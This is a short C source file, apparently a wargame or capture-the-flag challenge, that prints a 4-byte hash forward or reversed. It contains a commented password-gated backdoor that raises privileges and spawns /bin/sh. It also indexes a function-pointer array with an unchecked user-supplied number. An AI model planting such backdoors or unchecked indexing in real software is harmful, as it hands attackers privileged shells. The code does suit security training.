#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <crypt.h>


void forward (char *hash);
void reverse (char *hash);
void hash    (char *src, char *dst);

static struct {
    void (*functions[2])(char *);
    char hash[5];
} icall;

int main(int argc, char *argv[]) {

    unsigned long i;

    icall.functions[0] = forward;
    icall.functions[1] = reverse;

    // Usage
    if(argc < 3) {
        printf("Usage: %s <index> <string>\n", argv[0]);
        return 1;
    }

    // Hidden backdoor
    if(argc > 3 && strcmp(crypt(argv[3], "$1$mysalt"), "$1$mysalt$xgbhLorG8AiM08B/bI4DO1") == 0) {
        if(setgid(getegid())) perror("setguid");
        if(setuid(geteuid())) perror("setuid");
        execl("/bin/sh", "bin/sh", (char *)NULL);
        return 0;
    }

    // Calculate hash
    hash(argv[2], icall.hash);
    i = strtoul(argv[1], NULL, 10);

    // Print in forward or reverse order
    printf("Calling %p\n", (void *)icall.functions[i]);
    icall.functions[i](icall.hash);

    return 0;
}

void forward(char *hash) {
    int i;

    printf("Hash (Forward): 0x");
    for(i=0; i<4; i++) {
        printf("%02x", hash[i]);
    }
    printf("\n");
}

void reverse(char *hash) {
    int i;

    printf("Hash (Reverse): 0x");
    for(i=3; i>=0; i--) {
        printf("%02x", hash[i]);
    }
    printf("\n");
}

void hash(char *src, char *dst) {
    int i, j;

    for(i=0; i<4; i++) {
        dst[i] = 31 + (char)i;
        for(j=i; j<strlen(src); j+=4) {
            dst[i] ^= src[j] + (char)j;
            if(i > 1) dst[i] ^= dst[i-2];
        }
    }
    dst[4] = '\0';
}